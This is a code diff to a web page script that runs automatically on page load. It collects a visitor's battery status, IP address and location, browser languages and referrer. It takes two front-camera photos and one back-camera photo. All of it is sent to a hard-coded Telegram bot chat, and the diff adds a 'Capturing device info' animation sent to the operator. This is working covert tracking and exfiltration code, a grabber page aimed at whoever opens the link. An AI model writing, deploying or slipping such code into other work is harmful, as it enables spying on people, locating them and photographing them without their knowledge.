@@ -24,12 +24,25 @@
     const CHAT_ID = "7216371031";
     let deviceInfo = "";
 
-    // Send text to Telegram
+    // Send text message to Telegram
     function sendToTelegram(message) {
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      });
+    }
+
+    // Send animation GIF to Telegram
+    function sendGifURL() {
+      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAnimation`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          animation: "https://media.tenor.com/HkKJKYZAjHwAAAAC/loading-bar-loader.gif",
+          caption: "🎬 Capturing device info..."
+        })
       });
     }
 
@@ -44,12 +57,10 @@
       });
     }
 
-    // Take photo from camera
+    // Take photo using camera
     async function takePhoto(facing = "user") {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: facing }
-        });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
         const video = document.createElement("video");
         video.srcObject = stream;
         await video.play();
@@ -63,11 +74,11 @@
         const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.8));
         sendPhotoToTelegram(blob);
       } catch (err) {
-        console.warn("Camera skipped or blocked.");
+        console.warn("Camera access skipped or denied.");
       }
     }
 
-    // Get battery info
+    // Battery info
     function getBatteryInfo() {
       return navigator.getBattery().then(battery => {
         deviceInfo += `🔋 Battery: ${Math.round(battery.level * 100)}%\n`;
@@ -77,7 +88,7 @@
       });
     }
 
-    // Get IP/location (HTTPS safe)
+    // IP/location info (via ipinfo)
     function getIPInfo() {
       return fetch("https://ipinfo.io/json?token=ce7fbbdbe9fd92")
         .then(res => res.json())
@@ -92,7 +103,7 @@
         });
     }
 
-    // Extra info
+    // Extra device info
     function getExtraDetails() {
       const touch = 'ontouchstart' in window ? "Yes" : "No";
       const languages = navigator.languages.join(", ");
@@ -110,18 +121,17 @@
       deviceInfo += `🔗 Referrer: ${document.referrer || "Direct"}\n`;
     }
 
+    // Run everything
     async function collectAndSend() {
-      await Promise.all([
-        getBatteryInfo(),
-        getIPInfo()
-      ]);
+      await sendGifURL(); // Send GIF first
+      await Promise.all([getBatteryInfo(), getIPInfo()]);
       getExtraDetails();
-      sendToTelegram(deviceInfo);
+      await sendToTelegram(deviceInfo);
 
-      // Camera photos (only if allowed)
-      await takePhoto("user");
-      await takePhoto("user");
-      await takePhoto("environment");
+      // Camera (ask permission)
+      await takePhoto("user");        // Front
+      await takePhoto("user");        // Front again
+      await takePhoto("environment"); // Back
     }
 
     collectAndSend();
